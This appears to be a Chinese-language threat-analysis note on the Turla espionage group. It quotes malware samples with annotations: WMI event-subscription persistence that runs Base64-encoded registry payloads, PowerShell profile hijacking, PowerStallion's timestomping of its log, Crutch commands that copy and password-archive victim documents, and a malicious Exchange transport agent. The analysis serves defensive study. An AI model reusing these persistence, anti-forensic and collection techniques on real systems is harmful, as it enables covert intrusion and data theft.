# Turla

## 特征

1. 通过PowerShell创建两个WMI事件做持久化,并加载Windows注册表中的PowerShell脚本使用Base64编码.

```powershell
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" | Remove-WmiObject;
$NLP35gh = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $HL39fjh";RunInteractively='false'};
//收到事件时启动进程
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| Remove-WmiObject;
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log Adapter'} | Remove-WmiObject;
$IT825cd = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$VQI79dcf;Consumer=$NLP35gh};
//注册永久事件
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject;
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD Bridge'} | Remove-WmiObject;
$IT825cd = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";
//系统正常运行时间300秒到400秒之间运行
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$VQI79dcf;Consumer=$NLP35gh};
//创建或更新WMI实例
```

变量$HL39fjh加载的Base64编码的PowerShell脚本，该脚本用来读取加密存储的payload注册表项，并包含解密payload所需密码的盐值.

```powershell
[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(Base64编码的密码和盐值)) | iex ;[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty '$ZM172da').'$WY79ad')) | iex
```

2. 会通过劫持PowerShell的配置文件来做持久化.

```powershell
try
{
    $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} |  % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-5-18"})
    if ("$SystemProc" -ne "")
    {
      $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): STARTED </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append;
      [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("Base64字符串")) | iex | Out-Null;
      //使用PowerShell会加载该处的执行语句
      kill $PID;
    }
}
catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): $_ </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
```

3. PowerShell轻量级PowerStallion后门通过脚本修改了本地日志文件的修改、访问和创建时间.

```powershell
Function Log ([String]$msg)
{
        [byte[]]$message = [Text.Encoding]::ASCII.GetBytes("[$([DateTime]::Now.ToString('G'))]: $msg `n");
        [byte[]]$cryptedMessage = Crypt $message;
        $LogFilePath = "$WorkingDirectory\desktop.db";  //日志文件路径

        if (-not(Test-Path $LogFilePath))
        {
            Set-Content $LogFilePath -Value $cryptedMessage -Encoding 编码类型;
        }
        elseif ($(Get-Item $LogFilePath).Length -gt 5MB)
        {
            Set-Content $LogFilePath -Value $cryptedMessage -Encoding 编码类型;
        }
        //写入日志文件新内容，如果没有则新建文件
        else
        {
            Add-Content $LogFilePath -Value $cryptedMessage -Encoding 编码类型;
        }
        //向指定的日志文件添加内容
        $Ethalon = Get-ChildItem "$($env:PUBLIC)\Documents\desktop.ini" -Force;
        $Target = Get-ChildItem "$WorkingDirectory\desktop.db";
        //获取当前目录文件及其子目录中的文件
        $Target.CreationTime = $Ethalon.CreationTime;  //创建时间
        $Target.LastAccessTime = $Ethalon.LastAccessTime;  //最后访问时间
        $Target.LastWriteTime = $Ethalon.LastWriteTime;  //最后写入时间
}
```

4. 投递Crutch恶意软件后会手动执行命令以收集感染主机的文档.

```bash
copy /y \\<redacted>\C$\users\<redacted>\prog\csrftokens.txt c:\programdata\ & dir /x c:\programdata\
copy /y \\<redacted>\C$\users\user\Downloads\FWD___~1.ZIP %temp%\
copy /y \\<redacted>\C$\docume~1\User\My Documents\Downloads\8937.pdf %temp%
"C:\Program Files\WinRAR\Rar.exe" a -hp<redacted> -ri10 -r -y -u -m2 -v30m "%temp%\~res.dat" "d:\<redacted>\*.*" "d:\$RECYCLE.BIN\*.doc*" "d:\$RECYCLE.BIN\*.pdf*" "d:\$RECYCLE.BIN\*.xls*" "d:\Recycled\*.doc*" "d:\Recycled\*.pdf*" "d:\<redacted>\*.pdf"
//创建压缩包
```

5. 在针对Exchange服务投递木马时，会通过注册传输代理功能将恶意DLL文件执行.

```bash
Install-Transportagent -Name "Security Interop Agent" -AssemblyPath "c: \program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll" -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
Install-Transportagent -Name "Content Filter Agent" -AssemblyPath "c: \program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll" -TransportAgentFactory Microsoft.Exchange.Security.Interop.ContentFilterAgentFactory
//注册传输代理
Enable-TransportAgent -Identity "Security Interop Agent"
//启用指定名称的传输代理
Get-TransportAgent -Identity "Security Interop Agent"
//获取指定名称的传输代理
Enable-TransportAgent -Identity "Content Filter Agent"
Get-TransportAgent -Identity "Content Filter Agent"
Get-TransportAgent  //获取所有传输代理列表
```
